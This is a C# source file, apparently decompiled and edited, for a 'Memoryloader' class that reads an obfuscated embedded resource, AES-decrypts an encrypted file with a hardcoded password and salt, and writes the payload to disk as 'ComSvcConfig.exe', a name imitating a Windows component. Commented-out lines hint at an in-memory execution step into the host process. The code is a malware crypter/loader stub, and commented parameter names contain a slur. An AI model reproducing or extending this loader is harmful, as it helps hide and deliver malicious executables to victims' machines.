using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using static System.Net.Mime.MediaTypeNames;

public static class Memoryloader
{
	// Token: 0x06000002 RID: 2 RVA: 0x00002680 File Offset: 0x00000880
	public static void WeirdByteShit()
	{
        //byte[] byte1 = Converter("tmmKRonOd3OPBDsMTH3CLrias");
        //byte[] byte2 = Loader(byte1, "zoqjEyC7wmysCX6QnKK9LkGtI");
        //WinLib.WierdBool(Application.ExecutablePath, byte2, false);
        //WriteToFile(byte1, "C:\\Users\\user\\Desktop\\test.exe");
        //WriteToFile(byte1, "C:\\Users\\user\\Desktop\\test.exe");

    }

    public static void WriteToFile(byte[] byte1, string path)
	{
		File.WriteAllBytes(path, byte1);
	}

	// Token: 0x06000003 RID: 3 RVA: 0x000026DC File Offset: 0x000008DC
	public static byte[] Converter()
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		byte[] result;
		using (Stream manifestResourceStream = executingAssembly.GetManifestResourceStream("tmmKRonOd3OPBDsMTH3CLrias"))
		{
			if (manifestResourceStream == null)
			{
				result = null;
			}
			else
			{
				byte[] array = new byte[manifestResourceStream.Length];
				manifestResourceStream.Read(array, 0, array.Length);
                result = array;
				WriteToFile(result, "C:\\Users\\user\\Desktop\\test.exe");
			}
		}
		return result;
	}

	// Token: 0x06000004 RID: 4 RVA: 0x00002758 File Offset: 0x00000958
	//private static byte[] Loader(byte[] faggotry1, string faggotry2)
	//{
	//return Memoryloader.MemoryStreamLoader(faggotry1, faggotry2);
	//}

	// Token: 0x06000005 RID: 5 RVA: 0x00002774 File Offset: 0x00000974
	public static void writeStreamToFile() { 
	}
	public static byte[] MemoryStreamLoader()
	{
		byte[] result = null;
		byte[] salt = new byte[]
		{
			26,
			20,
			202,
			234,
			136,
			123,
			69,
			47
		};
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				byte[] pathtofiel = File.ReadAllBytes("C:\\Users\\user\\Desktop\\ukandoittoo\\yKzaxnC5fxchxks9YFp1XUx02");
				byte[] bytes = Encoding.UTF8.GetBytes("zgS6yyJapl3iUymhrK4oGBhq1");
                Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(pathtofiel, 0, pathtofiel.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();

                WriteToFile(result, "C:\\Users\\user\\Desktop\\ComSvcConfig.exe");

            }
        }
		return result;
	}
}
